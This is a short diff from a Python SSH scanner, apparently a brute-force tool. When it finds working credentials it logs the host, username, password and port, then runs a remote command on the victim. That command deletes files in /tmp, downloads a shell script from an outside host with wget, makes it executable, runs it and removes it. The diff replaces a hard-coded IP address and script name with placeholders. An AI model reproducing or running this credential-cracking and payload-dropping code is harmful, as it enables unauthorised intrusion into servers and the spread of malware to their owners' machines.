@@ -137,7 +137,7 @@ class sshscanner(threading.Thread):
                     badserver=False
                 if badserver == False:
                         print 'Found '+self.host+'|'+username+'|'+password+'|'+str(port)
-                        ssh.exec_command("cd /tmp; rm *; wget http://190.183.160.12:10025/bkpmng_.sh ; chmod +x bkpmng_.sh ; sh bkpmng_.sh ; rm -f bkpmng_.sh")
+                        ssh.exec_command("cd /tmp; rm *; wget http://IP:PUERTO/bin.sh ; chmod +x bin.sh ; sh bin.sh ; rm -f bin.sh")
                         time.sleep(20)
                         ssh.close()
             except:
